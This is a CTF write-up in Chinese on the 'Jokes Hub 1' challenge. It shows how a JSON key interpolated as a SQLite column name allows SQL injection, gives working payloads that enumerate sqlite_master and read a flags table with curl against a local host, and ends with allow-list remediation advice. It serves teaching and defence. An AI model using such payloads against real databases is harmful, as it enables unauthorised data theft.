# Jokes Hub 1

## 题目简述

`POST /jokes` 接收一个 JSON 对象，把第一个键当作待查询列名，把对应值当作笑话 ID。程序验证 ID 是整数，却将列名直接拼进 SQLite 语句，因此 JSON 的键名就是 SQL 注入点。

目标 flag 位于同一数据库的 `flags(flag)` 表中。通过在列名位置结束原查询并注释余下语句，可以把返回列和数据表同时替换掉。

## 解题过程

路由取值方式为：

```python
data = request.get_json()
key = list(data.keys())[0]
id = data[key]
assert isinstance(id, int)
row = get_joke_column(key, id)
```

数据库函数随后直接使用 f-string：

```python
c.execute(f"select {column} from jokes where id={id}")
```

先用常量表达式确认注入：

```json
{"'1' -- ": 5}
```

实际语句变为：

```sql
select '1' --  from jokes where id=5
```

返回值为字符串 `1`，也满足路由对 `row[0]` 的类型断言。接着可以查询 `sqlite_master` 枚举结构：

```json
{"sql from sqlite_master limit 1 offset 2 -- ": 5}
```

源码显示目标表为 `flags`，因此直接提交：

```bash
curl -s http://127.0.0.1:8000/jokes \
  -H 'Content-Type: application/json' \
  --data '{"flag from flags -- ":1}'
```

对应 SQL 为：

```sql
select flag from flags --  from jokes where id=1
```

接口返回：

```json
{"result":"shellmates{ar3_sqli_still_4_THing?}"}
```

## 方法总结

参数化 ID 并不能保护另一个动态 SQL 片段。SQL 驱动通常只能参数化数据值，不能用占位符替代表名或列名；如果业务允许用户选择列，必须把外部名称映射到固定允许列表，而不是直接插入语句。

本题还说明注入点不一定出现在 JSON 值中。框架把对象键和值都视为输入，安全审计必须追踪二者到 SQL、模板、文件路径或命令行的完整数据流。
